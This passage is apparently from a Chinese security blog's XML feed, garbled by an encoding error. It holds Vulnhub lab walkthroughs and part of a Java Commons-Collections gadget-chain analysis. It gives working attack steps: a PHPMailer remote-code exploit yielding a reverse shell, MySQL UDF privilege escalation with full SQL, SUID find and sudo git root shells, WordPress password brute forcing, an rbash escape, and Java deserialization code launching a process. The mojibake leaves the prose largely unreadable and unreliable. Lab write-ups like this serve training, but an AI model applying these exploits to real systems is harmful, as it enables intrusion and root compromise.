title="flagâ€”2ï¼Œ3"></a>flagâ€”2ï¼Œ3</h2><p>è®¿é—®README.mdå‘ç°å­˜åœ¨ä¸€ä¸ªphpmaileræœåŠ¡ï¼Œå¹¶ä¸”åœ¨VERSIONä¸‹çœ‹çš„ç‰ˆæœ¬ä¸º5.2.16æœäº†ä¸€ä¸‹18ä»¥ä¸‹å­˜åœ¨<strong>PHPMailerè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</strong>æœ¬æ¥æƒ³æ‰‹å·¥åˆ©ç”¨ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œç›´æ¥åˆ©ç”¨<strong>searchsploit</strong>æœç´¢å¯ä»¥åˆ©ç”¨çš„æ¼æ´<br><code>searchsploit PHPMailer</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512376.png" alt="image-20230530151222302"><br>å°†pythoné‚£æ¡expæ‹·è´å‡ºæ¥ï¼Œç„¶åä¿®æ”¹ç›®æ ‡åœ°å€å’Œåå¼¹shellçš„åœ°å€ä»¥åŠä¸Šä¼ çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/40974.py /home/joker27/æ¡Œé¢</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512462.png" alt="image-20230530151238409"><br>ç„¶åæ‰§è¡Œexpç”Ÿæˆåé—¨æ–‡ä»¶<br><code>python 40974.py</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301512317.png" alt="image-20230530151254251"><br>ç›‘å¬ç«¯å£ï¼Œå…ˆè®¿é—®<a href="http://192.168.75.135/contact.php%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AE%BF%E9%97%AE%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9%E6%88%90%E5%8A%9F">http://192.168.75.135/contact.phpç”Ÿæˆåé—¨æ–‡ä»¶ï¼Œç„¶åè®¿é—®åé—¨æ–‡ä»¶åå¼¹æˆåŠŸ</a><br>ä½¿ç”¨pythonè·å¾—ä¸€ä¸ªäº¤äº’å¼shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>æŸ¥çœ‹æƒé™ï¼Œæ˜¯ä¸€ä¸ªwww-dataæƒé™å¾ˆä½<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513510.png" alt="image-20230530151311480"><br>ä½¿ç”¨å‘½ä»¤<code>find / -name &quot;flag*&quot;</code>ç›´æ¥æœç´¢flagï¼ŒæŸ¥åˆ°flag2å’Œ3<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513241.png" alt="image-20230530151323212"><br>flag2ç›´æ¥å‘½ä»¤æ‰“å¼€å°±è¡Œï¼Œflag3æ˜¯ä¸€å¼ å›¾ç‰‡åœ¨webä¸‹è®¿é—®<code>http://192.168.75.135/wordpress/wp-content/uploads/2018/11/flag3.png</code>å³å¯å¾—åˆ°ï¼Œæœ€åä¸€ä¸ªflagè‚¯å®šå°±è¦ææƒäº†</p><h2 id="flagâ€“4-udfææƒ"><a href="#flagâ€“4-udfææƒ" class="headerlink" title="flagâ€“4(udfææƒ)"></a>flagâ€“4(udfææƒ)</h2><p>ä»¥å‰åªäº†è§£ä½†æ˜¯æ²¡ç©è¿‡udfææƒä¹Ÿæ˜¯æ‹¿è¿™ä¸ªé¶åœºç»ƒç»ƒ<br>ä½¿ç”¨LinEnum.shå¯¹Linuxè¿›è¡Œä¿¡æ¯æœé›†ï¼Œé¡¹ç›®åœ°å€ï¼š<code>https://github.com/rebootuser/LinEnum</code><br>åˆ©ç”¨pythonèµ·ä¸€ä¸ªä¸´æ—¶webæœåŠ¡ï¼Œpython3ä¸‹è¿è¡Œ<code>python -m http.server</code><br>æœåŠ¡é»˜è®¤ç«¯å£8000ï¼Œåˆ©ç”¨è¿™ä¸ªæœåŠ¡å°†LinEnum.shæ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºä¸Šè¿è¡Œï¼Œè¿™ä¸ªæ–¹æ³•åœ¨<strong>Vulnhubâ€”â€”Ai-Web1</strong>ä¹Ÿæœ‰è¿ç”¨ï¼Œä¸çŸ¥é“çš„å¯ä»¥å‚è€ƒæˆ‘å‰é¢çš„æ–‡ç« ï¼Œç„¶åä½¿ç”¨wgetè¿œç¨‹ä¸‹è½½shæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301513476.png" alt="image-20230530151348411"><br>ç„¶åè¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œéœ€è¦åŠ æƒè¿è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514588.png" alt="image-20230530151402551"><br>å‡ºæ¥çš„ä¿¡æ¯å¾ˆå¤šï¼Œå‘ç°mysqlæ˜¯åœ¨rootä¸‹è¿è¡Œçš„ï¼Œå…¶å®ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤<code>ps aux | grep root</code>æŸ¥çœ‹ä»¥rootè¿è¡Œçš„è¿›ç¨‹<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514838.png" alt="image-20230530151412795"><br>æ‰€ä»¥å¦‚æœæ•°æ®åº“ç‰ˆæœ¬ä¸æ˜¯å¾ˆé«˜(&lt;&#x3D; 5.7.14ï¼Œ5.6.32ï¼Œ5.5.51)å°±å¯ä»¥ç”¨udfæ¥ææƒï¼Œå°±ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•å¾—åˆ°æ•°æ®åº“ç‰ˆæœ¬ï¼Œæœ€ç»ˆåœ¨å¦‚ä¸‹é…ç½®æ–‡ä»¶å¾—åˆ°mysqlçš„è´¦å·å¯†ç <br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514005.png" alt="image-20230530151425953"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514656.png" alt="image-20230530151438618"><br>è¿æ¥æ•°æ®åº“<code>mysql -uroot -pR@v3nSecurity</code><br>æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301514125.png" alt="image-20230530151450089"><br><strong>æŸ¥çœ‹ secure_file_priv  çš„å€¼</strong><br>secure_file_priv æ˜¯ç”¨æ¥é™åˆ¶ load dumpfileã€into  outfileã€load_file() å‡½æ•°åœ¨å“ªä¸ªç›®å½•ä¸‹æ‹¥æœ‰ä¸Šä¼ æˆ–è€…è¯»å–æ–‡ä»¶çš„æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line">     å½“ secure_file_priv çš„å€¼ä¸º NULL ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºï¼Œæ­¤æ—¶æ— æ³•ææƒ</span><br><span class="line">     å½“ secure_file_priv çš„å€¼ä¸º /tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶ mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨ /tmp/ ç›®å½•ä¸‹ï¼Œæ­¤æ—¶å¯èƒ½ä¹Ÿæ— æ³•ææƒ</span><br><span class="line">     å½“ secure_file_priv çš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹ mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ï¼Œæ­¤æ—¶å¯ææƒ</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515020.png" alt="image-20230530151509989"><br>å¯ä»¥ä½¿ç”¨udfææƒï¼Œå¹¶ä¸”å¯¼å‡ºæ²¡åšé™åˆ¶ï¼Œkaliä½¿ç”¨å‘½ä»¤<code>searchsploit mysql</code> æ‰¾åˆ°åˆ©ç”¨exp<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515647.png" alt="image-20230530151520614"><br>å°†expå¤åˆ¶ç”Ÿæˆ<code>.so</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/1518.c //home/joker27/æ¡Œé¢</span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o udf.so 1518.o -lc</span><br><span class="line"></span><br><span class="line">å‚æ•°å«ä¹‰</span><br><span class="line">-g ç”Ÿæˆè°ƒè¯•ä¿¡æ¯</span><br><span class="line">-c ç¼–è¯‘ï¼ˆäºŒè¿›åˆ¶ï¼‰</span><br><span class="line">-sharedï¼šåˆ›å»ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œè¾“å…¥æ–‡ä»¶å¯ä»¥æ˜¯æºæ–‡ä»¶ã€æ±‡ç¼–æ–‡ä»¶æˆ–è€…ç›®æ ‡æ–‡ä»¶ã€‚</span><br><span class="line">-oï¼šæ‰§è¡Œå‘½ä»¤åçš„æ–‡ä»¶å</span><br><span class="line">-lcï¼š-l åº“ cåº“å</span><br></pre></td></tr></table></figure><p>åŒæ ·ç”¨pythonçš„ä¸´æ—¶æœåŠ¡å°†<code>.so</code>æ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºï¼Œæ¥ä¸‹æ¥çš„æ­¥éª¤å°±æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line"></span><br><span class="line">//åˆ›å»ºä¸€ä¸ªè¡¨å¹¶ä¸”åŒ…å«ä¸€ä¸ªblobå‹(blobå‹ç”¨äºå‚¨å­˜å¤§å‹äºŒè¿›åˆ¶å¯¹è±¡)çš„åˆ—</span><br><span class="line">create table foo(line blob);</span><br><span class="line"></span><br><span class="line">//å°†udf.soæ–‡ä»¶æ’å…¥è¡¨ä¸­</span><br><span class="line">insert into foo values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"></span><br><span class="line">//å°†äºŒè¿›åˆ¶æ•°æ®å¯¼å‡ºåˆ°pluginç›®å½•ä¸‹</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">//åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°do_systemï¼Œç±»å‹ä¸ºintegerï¼Œåˆ«åudf.so</span><br><span class="line">create function do_system returns integer soname &#x27;udf.so&#x27;;</span><br><span class="line"></span><br><span class="line">//æŸ¥è¯¢æ˜¯å¦åˆ›å»ºæˆåŠŸ</span><br><span class="line">select * from mysql.func;</span><br><span class="line"></span><br><span class="line">//åˆ©ç”¨è‡ªå®šä¹‰å‡½æ•°æ”¹å˜findå‘½ä»¤æƒé™</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"></span><br><span class="line">//ä½¿ç”¨findææƒ</span><br><span class="line">touch hello</span><br><span class="line">find hello -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p>zè¿™é‡Œå†æ¸©ä¹ ä¸€éfindææƒï¼Œå°±æ˜¯éšä¾¿æŸ¥æ‰¾ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“ç„¶è¿™ä¸ªæ–‡ä»¶å¾—å­˜åœ¨ï¼Œå¯¹æŸ¥æ‰¾åˆ°çš„åˆ©ç”¨å‚æ•°<code>-exec</code>æ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤ï¼Œç”±äºfindæ˜¯ä»¥rootè¿è¡Œçš„æ‰€ä»¥è¿™ä¸ªshellè‡ªç„¶ä¹Ÿå°±æ˜¯rootäº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515774.png" alt="image-20230530151533731"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305301515043.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-2</title>
      <link href="/undefined/35498.html"/>
      <url>/undefined/35498.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>ä¸‹è½½å®Œåå°±ä¸€ä¸ªovaæ–‡ä»¶ï¼ŒVmwareæ‰“å¼€å°±è¡Œ</p><h2 id="flagâ€“1"><a href="#flagâ€“1" class="headerlink" title="flagâ€“1"></a>flagâ€“1</h2><p>è€æ­¥éª¤ï¼Œæ‰«æå­˜æ´»IP<br><code>arp-scan -l</code><br>é€šè¿‡macåœ°å€åˆ¤æ–­IPä¸º192.168.75.134<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071823280.png" alt="image-20230507182024787"><br>nmapæŸ¥çœ‹å…¨éƒ¨ç«¯å£ï¼Œ-vä¸ºæŸ¥çœ‹ç‰ˆæœ¬å·<br><code>nmap -A -p- -v 192.168.75.134</code><br>æœ‰ä¸€ä¸ª80ç«¯å£ï¼Œè¿˜æœ‰ä¸€ä¸ª7744æ”¾äº†ssh<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071824518.png" alt="image-20230507182437450"><br>è®¿é—®IPçš„æ—¶å€™å‘ç°è®¿é—®å¤±è´¥ï¼Œå¹¶ä¸”é‡å®šå‘åˆ°åŸŸå<code>dc-2</code>åŸå› ä¸ºæœ¬åœ°æ— æ³•è§£æåŸŸåï¼Œæ‰€ä»¥éœ€è¦ç¼–è¾‘&#x2F;etc&#x2F;hostsæ–‡ä»¶ï¼Œæ·»åŠ é¶æœºIPåœ°å€åŠå¯¹åº”åŸŸå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.75.134  dc-2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071824150.png" alt="image-20230507182457099"><br>ç”±äºæ˜¯åœ¨kaliä¸‹å†™å…¥æ‰€ä»¥åªèƒ½åœ¨kaliä¸‹è®¿é—®ï¼Œç„¶ååœ¨é¡µé¢æ‰¾åˆ°flag1<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825846.png" alt="image-20230507182506788"><br>ç„¶åæ ¹æ®æç¤ºä¸‹ä¸€ä¸ªflagè¦ä½¿ç”¨kaliä¸‹çš„cewlï¼Œå¹¶ä¸”éœ€è¦ç™»å½•ï¼Œæ‰€ä»¥å¾…ä¼šå„¿è¦æ‰«ä¸€ä¸‹ç›®å½•</p><h2 id="flagâ€“2"><a href="#flagâ€“2" class="headerlink" title="flagâ€“2"></a>flagâ€“2</h2><p>å…ˆä½¿ç”¨cewlç”Ÿæˆä¸€ä¸‹å¯†ç å­—å…¸<br><code>cewl dc-2 -w dict.txt</code><br>ç„¶åä½¿ç”¨WPscanæšä¸¾ä¸€ä¸‹ç”¨æˆ·<br><code>wpscan --url dc-2 --enumerate u</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825397.png" alt="image-20230507182519333"><br>å¾—åˆ°ä¸‰ä¸ªç”¨æˆ·ï¼Œç„¶åä½¿ç”¨ä¸€å¼€å§‹ç”Ÿæˆçš„å­—å…¸è¿›è¡Œçˆ†ç ´<br><code>wpscan --url dc-2 --passwords dict.txt</code><br>å¾—åˆ°ä¸¤ä¸ªè´¦å·çš„å¯†ç <br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825746.png" alt="image-20230507182535717"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰«ä¸€ä¸‹åå°<code>dirb http://dc-2/ </code>å¾—åˆ°ç™»å½•åœ°å€ä¸º&#x2F;wp-adminï¼Œåˆ©ç”¨è´¦å·ç™»å½•æ‰¾åˆ°flag2<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071825804.png" alt="image-20230507182547769"></p><h2 id="flagâ€“3"><a href="#flagâ€“3" class="headerlink" title="flagâ€“3"></a>flagâ€“3</h2><p>ç„¶ååˆ©ç”¨ä¸€ä¸‹ä¹‹å‰æ‰«çš„sshæœåŠ¡ï¼Œç”¨tomçš„è´¦å·ç™»ä¸€ä¸‹<br><code>ssh tom@192.168.75.134 -p 7744</code>å¯†ç å°±æ˜¯ä¹‹å‰é‚£ä¸ªå¯†ç ï¼Œç„¶ålså¯ä»¥çœ‹åˆ°flagï¼Œä½†æ˜¯è¿™é‡Œåšäº†rbashé™åˆ¶ï¼Œæœ€ç»ˆä½¿ç”¨viæ‰“å¼€å¾—åˆ°flag3<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826231.png" alt="image-20230507182601203"></p><h2 id="flagâ€“4"><a href="#flagâ€“4" class="headerlink" title="flagâ€“4"></a>flagâ€“4</h2><p>æ ¹æ®flag3æç¤ºåˆ‡æ¢åˆ°å¦ä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯è¿™é‡Œç”¨ä¸äº†suå‘½ä»¤ï¼Œç”¨äº†rbashåŒ…è£¹å¾—ç»•è¿‡ä¸€ä¸‹<br>å…ˆç®€å•çœ‹ä¸€ä¸‹rbashæ˜¯ä»€ä¹ˆ</p><h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>rbash(The restricted mode of bash),ä¹Ÿå°±æ˜¯é™åˆ¶å‹bashï¼›æ˜¯å¹³æ—¶æ‰€è°“çš„ restricted shellçš„ä¸€ç§ï¼Œä¹Ÿæ˜¯æœ€å¸¸è§çš„ restricted shellï¼ˆrbashã€kshã€rshç­‰ï¼‰æ¸—é€ä¸­é‡åˆ°restricted shellæ˜¯ä¸€ä»¶å¾ˆçƒ¦äººçš„äº‹ï¼Œæ€»æœ‰æœ‰ä¸€ç§æŸæ‰‹æŸè„šçš„æ„Ÿè§‰ï¼›ä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹çœ‹å¦‚ä½•çªç ´å®ƒã€‚</p><h3 id="0x01ã€rbashä¸­çš„é™åˆ¶ï¼ˆæ­£å› ä¸ºæœ‰è¿™äº›é™åˆ¶æˆ‘ä»¬æ‰è¦çªç ´å®ƒï¼‰"><a href="#0x01ã€rbashä¸­çš„é™åˆ¶ï¼ˆæ­£å› ä¸ºæœ‰è¿™äº›é™åˆ¶æˆ‘ä»¬æ‰è¦çªç ´å®ƒï¼‰" class="headerlink" title="0x01ã€rbashä¸­çš„é™åˆ¶ï¼ˆæ­£å› ä¸ºæœ‰è¿™äº›é™åˆ¶æˆ‘ä»¬æ‰è¦çªç ´å®ƒï¼‰"></a>0x01ã€rbashä¸­çš„é™åˆ¶ï¼ˆæ­£å› ä¸ºæœ‰è¿™äº›é™åˆ¶æˆ‘ä»¬æ‰è¦çªç ´å®ƒï¼‰</h3><ul><li>ä¸èƒ½ä½¿ç”¨cdå‘½ä»¤ï¼ˆæ„å‘³ç€ä¸èƒ½æ›´æ”¹ç›®å½•ï¼‰</li><li>ä¸èƒ½è®¾ç½®æˆ–å–æ¶ˆç¯å¢ƒå˜é‡ï¼šSHELLï¼Œ PATHï¼Œ ENVï¼Œ BASH_ENV</li><li>å¯¼å…¥åŠŸèƒ½å—é™</li><li>æŒ‡å®šåŒ…å«å‚æ•°â€™&#x2F;â€˜æˆ–â€™-â€˜çš„æ–‡ä»¶å(å³å‘½åä¸­ä¸èƒ½åŒ…å« â€˜&#x2F; â€˜ æˆ–â€™-â€˜)</li><li>ä¸èƒ½ä½¿ç”¨ä½¿ç”¨ &gt;ï¼Œ&gt;|ï¼Œ &lt;&gt;ï¼Œ &gt;&amp;ï¼Œ &amp;&gt;ï¼Œ &gt;&gt; ç­‰é‡å®šå‘æ“ä½œç¬¦</li><li>ä¸èƒ½ä½¿ç”¨â€™set + râ€™æˆ–â€™set + oâ€™å…³é—­<br>ä»ä¸Šè¾¹è¿™äº›é™åˆ¶å¯çŸ¥rbashçš„å­˜åœ¨æ˜¯ä¸ºäº†æé«˜å®‰å…¨æ€§ï¼Œä½†æ˜¯ä¸¥é‡å½±å“äº†æˆ‘ä»¬åœ¨ç›®æ ‡æœºå™¨ä¸Šçš„ä¿¡æ¯æ”¶é›†ï¼Œä»¥åŠå¸¸ç”¨çš„åå¼¹shell(å¤§éƒ¨åˆ†éœ€è¦ç”¨åˆ°é‡å®šå‘ç¬¦)<br>è¿™é‡Œç»•è¿‡æ–¹æ³•å¾ˆå¤šï¼Œæˆ‘ç›´æ¥ç”¨wpçš„æ–¹æ³•<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh  #è°ƒç”¨/bin/shå‘½ä»¤è§£é‡Šå™¨</span><br><span class="line">a  </span><br><span class="line">/bin/bash   #ä½¿ç”¨bashå‘½ä»¤è§£é‡Šå™¨</span><br><span class="line">export PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbin  #è®¾ç½®ç¯å¢ƒå˜é‡</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826226.png" alt="image-20230507182618182"><br>åˆ‡æ¢æˆåŠŸï¼Œç„¶åè¿›å…¥jerryç›®å½•ä¸‹å¾—åˆ°flag4<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826271.png" alt="image-20230507182628216"></li></ul><h2 id="flagâ€“5"><a href="#flagâ€“5" class="headerlink" title="flagâ€“5"></a>flagâ€“5</h2><p>é€šè¿‡flag4æç¤ºä½¿ç”¨gitææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l    #æŸ¥çœ‹å¯ä»¥ä½¿ç”¨rootæƒé™æ— å¯†ç çš„å‘½ä»¤ï¼Œæœ‰gitå‘½ä»¤</span><br><span class="line">sudo git -p help #å¼ºåˆ¶è¿›å…¥äº¤äº’çŠ¶æ€</span><br><span class="line">!/bin/bash #æ‰“å¼€ä¸€ä¸ªç”¨æˆ·ä¸ºrootçš„shell</span><br><span class="line"></span><br><span class="line">æ³•2ï¼š</span><br><span class="line">sudo git help config #åœ¨æœ«è¡Œå‘½ä»¤æ¨¡å¼è¾“å…¥</span><br><span class="line">!/bin/bash æˆ–è€… !&#x27;sh&#x27; #æ‰“å¼€ä¸€ä¸ªç”¨æˆ·ä¸ºrootçš„shell</span><br></pre></td></tr></table></figure><p>ææƒæˆåŠŸï¼Œæ‹¿åˆ°æœ€åä¸€ä¸ªflag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305071826622.png" alt="image-20230507182637547"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾6</title>
      <link href="/undefined/29590.html"/>
      <url>/undefined/29590.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>åŸºæœ¬ä¸Šå’ŒCC1å·®ä¸å¤š</p><blockquote><p>jdk8u71<br>Comoons-Collections 3.2.1</p></blockquote><h2 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h2><p>å‰åŠæ®µé“¾å­ï¼Œ<code>LazyMap</code> ç±»åˆ° <code>InvokerTransformer</code> ç±»æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ç›´æ¥åˆ° <code>LazyMap</code> ä¸‹ï¼Œè¿™é‡Œå…ˆé‡æ–°ä¸€è¾¹LazyMap ç±»è°ƒç”¨è®¡ç®—å™¨çš„ EXPï¼Œçœ‹å‚è€ƒåšå®¢è¯´å¤šå†™æœ‰åˆ©äºæ¯”é‚£äº›EXPç¡®å®æ˜¯è¿™æ ·ï¼Œèƒ½åŠ æ·±ç†è§£ï¼Œåæ­£æ²¡åå¤„ï¼Œå¹¶ä¸”æˆ‘å‘ç°è‡ªå·±åˆæœ‰ç‚¹å¿˜è®°äº†ã€‚ã€‚ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line">        Class&lt;LazyMap&gt; mapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">classDeclaredMethod</span> <span class="operator">=</span> mapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        classDeclaredMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        classDeclaredMethod.invoke(map,r);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸‹ä¸€æ­¥å°±æ˜¯ç»§ç»­æ‰¾å“ªé‡Œè°ƒç”¨äº†getæ–¹æ³•ï¼Œçœ‹äº†åˆ©ç”¨é“¾ï¼Œä¸‹ä¸€ä¸ªç±»å’Œæ–¹æ³•æ˜¯<code>TiedMapEntry</code> ç±»ä¸­çš„ <code>getValue()</code>æ–¹æ³•ï¼Œè¿™ä¸ªé‡Œé¢è°ƒç”¨äº† <code>LazyMap</code> çš„ <code>get()</code> æ–¹æ³•ï¼Œç„¶åç»§ç»­ç¼–å†™EXPç¡®ä¿ç›®å‰é“¾å­å¯ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 